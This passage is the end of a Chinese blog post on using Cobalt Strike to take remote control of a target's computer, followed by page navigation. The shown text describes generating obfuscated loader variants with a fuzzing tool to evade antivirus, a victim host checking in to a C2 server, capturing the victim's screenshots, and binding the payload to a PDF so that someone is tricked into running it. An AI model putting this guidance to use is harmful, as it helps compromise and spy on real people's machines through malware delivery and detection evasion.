class="line"></span><br></pre></td></tr></table></figure>

<p>自行编译为exe文件，然后fuzz.exe  -f loder.go</p>
<p><img src="https://raw.githubusercontent.com/hack-xx/hu/main/img/17.png"></p>
<p>会自动生成一个result文件夹，里面存放了功能一样的exe文件</p>
<p><img src="https://raw.githubusercontent.com/hack-xx/hu/main/img/18.png"></p>
<p>随便点开一个，可以看到c2上成功上机</p>
<p><img src="https://raw.githubusercontent.com/hack-xx/hu/main/img/19.png"></p>
<p>我们来试试截图功能，发现成功返回受害者电脑内容，当权限为用户的适合才会返回截图，为system的时候不返回，因为system是类似于linux的操作台没有界面</p>
<p><img src="https://raw.githubusercontent.com/hack-xx/hu/main/img/20.png"></p>
<p>上面说除此之外，还有一种就是生成python类型payload，然后把生成的payload.py里面的信息给加密，最后编译，其实也还是免杀，看哪种加密方式能够免杀。生成的exe文件，一般不会被人点击，可以试试其他方式让别人来点，比如说绑定pdf，这里就不过多赘述了</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">Hack xx</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2025/09/26/cs%E9%81%A5%E6%8E%A7%E5%AF%B9%E6%96%B9%E4%B8%BB%E6%9C%BA%E6%B5%81%E7%A8%8B/">http://example.com/2025/09/26/cs%E9%81%A5%E6%8E%A7%E5%AF%B9%E6%96%B9%E4%B8%BB%E6%9C%BA%E6%B5%81%E7%A8%8B/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/xx.JPG" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/10/09/SQLlite%E4%B8%80%E4%BA%9Bwaf%E7%BB%95%E8%BF%87%E6%B3%A8%E5%85%A5/" title="SQLlite一些waf绕过注入"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">SQLlite一些waf绕过注入</div></div><div class="info-2"><div class="info-item-1">SQL注入之waf绕过  先跑个fuzz字典，发现Status状态码基本上为403 500，其中403为waf，500为需要正确的sql注入语句 123456789101112131415161718192021222324252627282930313233343536373839404142Request	Payload	Status code	Response received	Error	Timeout	Length	Comment0		403	36	false	false	1671	’	500	38	false	false	232       //中文逗号2	#	403	65	false	false	1673	union	500	35	false	false	2364	left	500	39	false	false	2285	substr	500	37	false	false	2306	mid	500	34	false	false	2277	 	403	44	false	false	1678	(	500	38	false	false	2249	)	500	38	fals...</div></div></div></a><a class="pagination-related" href="/2025/09/22/WMCTF-web-Guess/" title="WMCTF-web-Guess"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">WMCTF-web-Guess</div></div><div class="info-2"><div class="info-item-1">这个题目出的挺不错的，首先查看给的附件，源代码我贴在下面，顺便进行审计 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109from flask import Flask, request, jsonify, session, render_template, redirectimport randomrd = random.Random()   def generate_random_string():    #定义一个随机生成函数    return str(rd.getrandbits(32))app = Flask(__name__)app.secret_key = generate_rand...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/xx.JPG" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Hack xx</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/hack-xx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">有事联系QQ3038689262</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E7%94%A8cs4-3%E9%81%A5%E6%8E%A7%E5%AF%B9%E6%96%B9"><span class="toc-number">1.</span> <span class="toc-text">记录一次用cs4.3遥控对方</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A6%96%E5%85%88%E6%88%91%E4%BB%AC%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AAraw%E7%B1%BB%E5%9E%8B%E7%9A%84payload%EF%BC%8C%E5%A6%82%E5%9B%BE%E6%89%80%E7%A4%BA"><span class="toc-number">1.0.1.</span> <span class="toc-text">首先我们创建一个raw类型的payload，如图所示:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%84%B6%E5%90%8E%E7%94%A8%E4%B8%80%E4%B8%AAsgn%E5%8A%A0%E5%AF%86%E6%8A%8Apayload-bin%E7%BB%99%E5%8A%A0%E5%AF%86%E4%B8%80%E4%B8%8B"><span class="toc-number">1.0.2.</span> <span class="toc-text">然后用一个sgn加密把payload.bin给加密一下</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%8D%E4%B8%8A%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%AF%86%EF%BC%8C%E6%88%96%E8%80%85%E5%85%B6%E4%BB%96%E5%8A%A0%E5%AF%86"><span class="toc-number">1.0.3.</span> <span class="toc-text">再上一个加密，或者其他加密</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/21/LD-PRELOAD-%E5%8A%AB%E6%8C%81%E9%85%8D%E5%90%88SO%E6%B3%A8%E5%85%A5/" title="LD_PRELOAD 劫持配合SO注入">LD_PRELOAD 劫持配合SO注入</a><time datetime="2025-11-21T10:49:34.000Z" title="Created 2025-11-21 18:49:34">2025-11-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/03/shiro-CVE-2016-4437%E5%A4%8D%E7%8E%B0/" title="shiro:CVE-2016-4437复现">shiro:CVE-2016-4437复现</a><time datetime="2025-11-03T10:24:33.000Z" title="Created 2025-11-03 18:24:33">2025-11-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/29/Spring%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%E2%80%94%E2%80%94%E5%8F%8D%E5%B0%84/" title="Spring前置知识——反射">Spring前置知识——反射</a><time datetime="2025-10-29T10:33:25.000Z" title="Created 2025-10-29 18:33:25">2025-10-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/18/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%85%8D%E5%90%88%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="Phar反序列化配合文件上传">Phar反序列化配合文件上传</a><time datetime="2025-10-18T04:48:50.000Z" title="Created 2025-10-18 12:48:50">2025-10-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/15/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" title="python沙箱逃逸">python沙箱逃逸</a><time datetime="2025-10-15T10:40:44.000Z" title="Created 2025-10-15 18:40:44">2025-10-15</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By Hack xx</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.0</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>